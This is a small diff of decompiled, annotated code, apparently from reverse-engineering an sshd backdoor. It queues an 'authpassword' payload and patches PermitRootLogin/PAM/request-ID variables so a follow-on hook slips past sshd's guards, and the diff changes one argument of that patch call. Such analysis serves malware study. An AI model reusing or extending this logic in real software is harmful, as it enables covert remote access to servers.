@@ -161,7 +161,7 @@ LAB_00109216:
         sshd_ctx->pending_authpayload = payload_record;
         ctx->payload_state = PAYLOAD_STREAM_DISPATCHED;
         // AutoDoc: As soon as an authpassword payload is queued, refresh PermitRootLogin/PAM/request IDs so the follow-on hook won’t trip sshd’s guards.
-        state_ok = sshd_patch_variables(TRUE,FALSE,FALSE,0,ctx);
+        state_ok = sshd_patch_variables(TRUE,FALSE,FALSE,MONITOR_REQ_MODULI,ctx);
 LAB_001092e5:
         if (state_ok != FALSE) goto LAB_0010944f;
       }
